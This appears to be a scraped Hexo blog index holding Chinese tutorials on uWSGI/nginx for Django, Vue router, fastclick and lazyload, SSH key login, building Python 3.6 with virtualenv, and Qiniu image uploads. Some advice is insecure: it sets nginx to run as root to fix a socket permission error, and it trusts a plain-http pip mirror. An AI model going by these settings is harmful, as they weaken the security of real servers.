class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server unix:///data/www/vhosts/mysite/mysite.sock; # for a file socket</span><br></pre></td></tr></table></figure><p>然后重启 nginx<br>然后重新运行 uWSGI：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --socket mysite.sock --wsgi-file test.py</span><br></pre></td></tr></table></figure><p>这次是使用 <code>socket</code>选项去告诉配置 uWSGI 。</p><p>如果启动失败，检查 nginx 错误日志 （&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log）</p><p>如果出现<br><code>connect() to unix:///data/www/vhosts/mysite/mysite.sock failed (13: Permission denied)</code><br>修改 <code>/etc/nginx/nginx.conf</code>的<code>user</code>为<code>root</code>用户</p><h5 id="配置-uWSGI-使用-ini-文件去运行项目"><a href="#配置-uWSGI-使用-ini-文件去运行项目" class="headerlink" title="配置 uWSGI 使用 .ini 文件去运行项目"></a>配置 uWSGI 使用 .ini 文件去运行项目</h5><p>创建 <code>mysite_uwsgi.ini</code> 文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># mysite_uwsgi.<span class="property">ini</span> file</span><br><span class="line">[uwsgi]</span><br><span class="line"></span><br><span class="line"># <span class="title class_">Django</span>-related settings</span><br><span class="line"># the base directory (full path)</span><br><span class="line">chdir           = <span class="regexp">/data/</span>www/vhosts/mysite/</span><br><span class="line"># <span class="title class_">Django</span><span class="string">&#x27;s wsgi file</span></span><br><span class="line"><span class="string">module          = mysite.wsgi</span></span><br><span class="line"><span class="string"># the virtualenv (full path)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># process-related settings</span></span><br><span class="line"><span class="string"># master</span></span><br><span class="line"><span class="string">master          = true</span></span><br><span class="line"><span class="string"># maximum number of worker processes</span></span><br><span class="line"><span class="string">processes       = 30</span></span><br><span class="line"><span class="string"># the socket (use the full path to be safe</span></span><br><span class="line"><span class="string">socket          = /data/www/vhosts/mysite/socket.sock</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># ... with appropriate permissions - may be needed</span></span><br><span class="line"><span class="string">chmod-socket    = 664</span></span><br><span class="line"><span class="string"># clear environment on exit</span></span><br><span class="line"><span class="string">vacuum          = true</span></span><br><span class="line"><span class="string"># pidfile</span></span><br><span class="line"><span class="string">pidfile         = /data/www/vhosts/mysite/mysite.pid</span></span><br><span class="line"><span class="string"># logger</span></span><br><span class="line"><span class="string"># daemonize       = /data/www/vhosts/mysite/access.log</span></span><br></pre></td></tr></table></figure><p>然后使用该文件运行 uswgi：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --ini mysite_uwsgi.ini <span class="comment"># the --ini option is used to specify a file</span></span><br></pre></td></tr></table></figure><blockquote><blockquote><p>参考文献：Setting up Django and your web server with uWSGI and nginx<br><a href="http://uwsgi-docs.readthedocs.io/en/latest/tutorials/Django_and_nginx.html#basic-uwsgi-installation-and-configuration">http://uwsgi-docs.readthedocs.io/en/latest/tutorials/Django_and_nginx.html#basic-uwsgi-installation-and-configuration</a></p></blockquote></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Django </tag>
            
            <tag> nginx </tag>
            
            <tag> 性能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue2.X Router 的使用</title>
      <link href="/2017/10/14/Vue2-X-Router-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2017/10/14/Vue2-X-Router-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>用 Vue.js + vue-router 创建单页应用，是非常简单的。使用 Vue.js ，我们已经可以通过组合组件来组成应用程序，当你要把 vue-router 添加进来，我们需要做的是，将组件(components)映射到路由(routes)，然后告诉 vue-router 在哪里渲染它们。</p><span id="more"></span><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>默认vue-cli初始化（init）的时候会提示是否选择安装（选择yes），安装就完成了。</p><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><h6 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h6><p>vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 使用 router-link 组件来导航. --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 通过传入 `to` 属性指定链接. --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;router-link&gt; 默认会被渲染成一个 `&lt;a&gt;` 标签 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/index&quot;</span>&gt;</span>Go to Index<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 路由出口 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 路由匹配到的组件将渲染在这里 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>router/index.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Router</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="comment">// import index.vue 页面</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Index</span> <span class="keyword">from</span> <span class="string">&#x27;@/components/index&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Router</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/index&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;index&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Index</span></span><br><span class="line">  &#125;]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这样就会在<code>&lt;router-link to=&quot;/index&quot;&gt;Go to Index&lt;/router-link&gt;</code>中渲染一个a标签，点击跳转到<code>/index</code>，然后在<code>&lt;router-view&gt;&lt;/router-view&gt;</code>中渲染组件<code>index.vue</code></p><h6 id="配置重定向"><a href="#配置重定向" class="headerlink" title="配置重定向"></a>配置重定向</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">redirect</span>: <span class="string">&#x27;/index&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/index&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;index&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Index</span></span><br><span class="line">  &#125;]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这样在访问根路径为<code>/</code>时，会跳转到<code>/index</code>路径，达到访问默认域名时，直接跳转到首页的效果。</p><h6 id="配置点击路由时，路径的默认class类名（linkActiveClass）"><a href="#配置点击路由时，路径的默认class类名（linkActiveClass）" class="headerlink" title="配置点击路由时，路径的默认class类名（linkActiveClass）"></a>配置点击路由时，路径的默认class类名（linkActiveClass）</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">redirect</span>: <span class="string">&#x27;/index&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/index&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;index&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Index</span></span><br><span class="line">  &#125;]</span><br><span class="line">  ,</span><br><span class="line">  <span class="attr">linkActiveClass</span>: <span class="string">&#x27;nav-active&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>如果不配置，默认值为<code>router-link-exact-active</code></p><h6 id="配置路由的子路由及动态路由器配"><a href="#配置路由的子路由及动态路由器配" class="headerlink" title="配置路由的子路由及动态路由器配"></a>配置路由的子路由及动态路由器配</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">ArticleDetail</span> <span class="keyword">from</span> <span class="string">&#x27;@/components/article_detail/article_detail&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">redirect</span>: <span class="string">&#x27;/index&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/index&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;index&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">Index</span>,</span><br><span class="line">    <span class="attr">children</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;/index/:id&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="title class_">ArticleDetail</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;/search&#x27;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="title class_">Search</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;]</span><br><span class="line">  ,</span><br><span class="line">  <span class="attr">linkActiveClass</span>: <span class="string">&#x27;nav-active&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>配置子路由，只需在父路由里添加children属性，然后配置子路由即可，并在子路由的页面添加<code>&lt;router-link&gt;&lt;/router-link&gt;</code>。<br>动态路由<code>/index/:id/</code>的 <code>id</code>值可以用<code>this.$route.params.id</code>取到。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> vue-router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue 使用 fastclick 和 lazyload 图片懒加载</title>
      <link href="/2017/10/13/vue-%E4%BD%BF%E7%94%A8-fastclick-%E5%92%8C-lazyload-%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD/"/>
      <url>/2017/10/13/vue-%E4%BD%BF%E7%94%A8-fastclick-%E5%92%8C-lazyload-%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h4 id="使用fastclick"><a href="#使用fastclick" class="headerlink" title="使用fastclick"></a>使用fastclick</h4><p>fastclick用来处理移动端 click 事件 300 毫秒延迟。</p><h5 id="为什么会存在延迟？"><a href="#为什么会存在延迟？" class="headerlink" title="为什么会存在延迟？"></a>为什么会存在延迟？</h5><p>根据谷歌开发者文档</p><blockquote><p>…mobile browsers will wait approximately 300ms from the time that you tap the button to fire the click event. The reason for this is that the browser is waiting to see if you are actually performing a double tap.</p></blockquote><p>从点击屏幕上的元素到触发元素的 <code>click</code> 事件，移动浏览器会有大约 300 毫秒的等待时间。为什么这么设计呢？ 因为它想看看你是不是要进行双击（double tap）操作。</p><span id="more"></span><p>npm安装 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm install --save fastclick```</span><br><span class="line"></span><br><span class="line">在根目录的src/main.js中</span><br><span class="line"></span><br><span class="line">``` js</span><br><span class="line">import fastclick from <span class="string">&#x27;fastclick&#x27;</span></span><br><span class="line">fastclick.attach(document.body)</span><br></pre></td></tr></table></figure><h4 id="使用-lazyload-图片懒加载"><a href="#使用-lazyload-图片懒加载" class="headerlink" title="使用 lazyload 图片懒加载"></a>使用 lazyload 图片懒加载</h4><p>lazyload可以延迟加载长页面中的图片。在浏览器可视区域外的图片在初始状态下不会被载入，直到用户将页面滚动到它们所在的位置。</p><p>npm安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm install --save lazyload```</span><br><span class="line"></span><br><span class="line">``` js</span><br><span class="line">import VueLazyload from <span class="string">&#x27;vue-lazyload&#x27;</span></span><br><span class="line">Vue.use(VueLazyload, &#123;</span><br><span class="line">  loading: require(<span class="string">&#x27;@/common/images/defalut.png&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后在需要懒加载的<code>&lt;img&gt;</code>加上<code>v-lazy属性</code>即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img v-lazy=&quot;图片url&quot;&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> fastclick </tag>
            
            <tag> lazyload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh 连接远程服务器</title>
      <link href="/2017/09/06/https%E9%83%A8%E7%BD%B2/"/>
      <url>/2017/09/06/https%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<p>登上远程服务器，除了使用登录密码之外，我们还可以使用公钥key来免手动输入密码进行登录。</p><span id="more"></span><p>这里使用linux服务器，默认启用root账户。</p><p>先在远程服务器操作</p><p>1.启用root权限用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -i </span><br></pre></td></tr></table></figure><p>2.新建存放公钥的.ssh文件夹和放公钥文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line">vim authorized_keys</span><br></pre></td></tr></table></figure><p>按<code>a</code>，然后输入你的公钥<code>id_rsa.pub</code>，完成后按<code>esc</code> <code>:</code> <code>w</code> <code>q</code>保存退出</p><p>3.本地连接远程服务器</p><p>在本地电脑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br><span class="line">vim config</span><br></pre></td></tr></table></figure><p>添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host remote</span><br><span class="line">    HostName 远程服务器的ip</span><br><span class="line">    Port 22</span><br><span class="line">    User root</span><br><span class="line">    ServerAliveInterval 60</span><br></pre></td></tr></table></figure><p><code>esc</code> <code>:</code> <code>w</code> <code>q</code> 保存退出</p><p>然后就可以用 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@remote</span><br></pre></td></tr></table></figure><p>直接访问远程服务器了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 安装 python3.6 及 使用 Virtualenv 管理python版本</title>
      <link href="/2017/08/27/linux-%E5%AE%89%E8%A3%85-pyhton3-6-%E5%8F%8A-%E4%BD%BF%E7%94%A8-Virtualenv-%E7%AE%A1%E7%90%86python%E7%89%88%E6%9C%AC/"/>
      <url>/2017/08/27/linux-%E5%AE%89%E8%A3%85-pyhton3-6-%E5%8F%8A-%E4%BD%BF%E7%94%A8-Virtualenv-%E7%AE%A1%E7%90%86python%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>购买的云服务器装机的linux会自带python2.7和python3的版本，但是python3一般都不是最新版本的，所以想升级到最新版本，还得手动升级。文章主要讲怎么安装python3.6版本，使用Virtualenv管理python版本，使用豆瓣镜像的pip提速pip下载，以及一些安装时会遇到的bug。</p><span id="more"></span><p>1.安装必要的依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">apt-get install yum</span><br><span class="line">yum -y groupinstall development</span><br><span class="line">yum -y install zlib-devel</span><br><span class="line">yum -y install sqlite-devel</span><br><span class="line">apt-get install make</span><br></pre></td></tr></table></figure><p>2.安装 gcc、make 和 zlib 压缩&#x2F;解压缩库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aptitude -y install gcc make zlib1g-dev</span><br></pre></td></tr></table></figure><p>3.安装python3.6</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//已经cdn加速</span><br><span class="line"> wget https://cdn.zhengxiangling.com/Python-3.6.2.tar.xz</span><br><span class="line"> tar xJf Python-3.6.2.tar.xz</span><br><span class="line"> <span class="built_in">cd</span> Python-3.6.2</span><br><span class="line"> ./configure --with-ssl</span><br><span class="line"> make &amp;&amp; make altinstall</span><br></pre></td></tr></table></figure><p><code>--with-ssl</code> 是为了给 python3 增加 ssl模块</p><p>4.查看python3的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -V</span><br></pre></td></tr></table></figure><p>5.配置pip，使用豆瓣镜像加速下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.pip</span><br><span class="line">vim pip.conf</span><br></pre></td></tr></table></figure><p>  然后在<code>pip.conf</code>中添加内容，<br>  按 <code>a</code><br>  然后添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">trusted-host = pypi.douban.com</span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br></pre></td></tr></table></figure><p>  写好后按<code>wq</code>保存</p><p>6.下载virtualenv</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line">//涉及到权限时，使用 sudo 执行</span><br><span class="line">sudo pip install virtualenv</span><br></pre></td></tr></table></figure><p>7.创建python虚拟环境</p><p>上面安装的python3.6的文件夹路径默认是在 <code>/usr/python3</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//进到用到存放虚拟环境文件夹的路径，一般放在 ~ 中</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">virtualenv -p /usr/local/bin/python3.6 env3.6</span><br></pre></td></tr></table></figure><p>8.激活virtualenv</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> env3.6</span><br><span class="line"><span class="built_in">source</span> ./bin/activate</span><br></pre></td></tr></table></figure><p>  这样就可以激活 virtualenv了</p><p>  如果在其他文件夹操作时，想激活虚拟环境，也可以执行</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/env3.6/bin/activate</span><br></pre></td></tr></table></figure><p>  来进行激活</p><p>9.关闭virtualenv</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django 运用 七牛云 作为图床上传图片</title>
      <link href="/2017/08/25/Django-%E4%B8%8A%E4%BC%A0%E4%B8%83%E7%89%9B%E5%9B%BE%E7%89%87/"/>
      <url>/2017/08/25/Django-%E4%B8%8A%E4%BC%A0%E4%B8%83%E7%89%9B%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<p>用 七牛云 作为图床，是一个不错的选择，有一定免费量的存储空间。本文介绍怎么使用 七牛云 来存储图片。</p><span id="more"></span><h4 id="1-注册七牛云个人账户"><a href="#1-注册七牛云个人账户" class="headerlink" title="1.注册七牛云个人账户"></a>1.注册七牛云个人账户</h4><p>选择个人账户</p><h4 id="2-创建存储空间"><a href="#2-创建存储空间" class="headerlink" title="2.创建存储空间"></a>2.创建存储空间</h4><p>注册成功在资源主页 点击对象存储 –&gt;立即添加，存储名称 （按自己喜好），这里为了后面方便先起名为chuangyi（创意），存储区域默认，访问空间选择公开空间。–&gt; 确定创建</p><h4 id="3-获取有用的信息。"><a href="#3-获取有用的信息。" class="headerlink" title="3.获取有用的信息。"></a>3.获取有用的信息。</h4><p>1）秘钥<br>左边栏，进入个人中心，点击秘钥管理，然后会有公钥和密钥。</p><p>|AccessKey|SecretKey<br>|: ————- :|:————-:|<br>|AK:a40Z71LFfbz_kDJnfOJflyI**|SK:JnfOJflyIOYpMy6eOnXMbsP**|</p><p>这里的公钥和密钥后面会有用。<br>2）测试域名<br>  找到存储空间列表，点击chuangyi，空间概览里右边有测试域名。<br>  我这里是 <code>opjb0b***.bkt.clouddn.com</code> 每个人的都会不一样。</p><h4 id="4-在django项目中引入七牛。"><a href="#4-在django项目中引入七牛。" class="headerlink" title="4.在django项目中引入七牛。"></a>4.在django项目中引入七牛。</h4><p>在有 manager.py的目录下，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install qiniu</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">easy_install qiniu</span><br></pre></td></tr></table></figure><p>ps：如果受权限限制就用sudo执行。</p><h4 id="5-配置七牛"><a href="#5-配置七牛" class="headerlink" title="5.配置七牛"></a>5.配置七牛</h4><p>1)在cyzc的settings.py中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> qiniu</span><br><span class="line"></span><br><span class="line">qn = qiniu.Auth(</span><br><span class="line">    <span class="string">&#x27;a40Z71LFfbz_kDJnfOJflyI**&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;JnfOJflyIOYpMy6eOnXMbsP**&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>（说明：Auth中填入的是之前说的公钥和秘钥。每个人的公钥和密钥都不一样，请自行替换）</p><p>2）运用七牛<br>从views.py中传token值到页面中。<br>引入qn<br>views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cyzc.settings <span class="keyword">import</span> qn</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qn_test</span>(<span class="params">request</span>):</span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">&#x27;upload_token&#x27;</span>: qn.upload_token(<span class="string">&quot;chuangyi&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>将token值返回给html，因为用七牛上传图片时需要上传的权限，这个token值就是上传时需要的证明。<br>其中upload_token()中的值为对应的七牛上面创建的存储空间的名字。</p><p>3）在html页面给input绑定这个token值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if upload_token %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;qn&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://upload.qiniu.com/&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; upload_token &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;qnUpload&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span 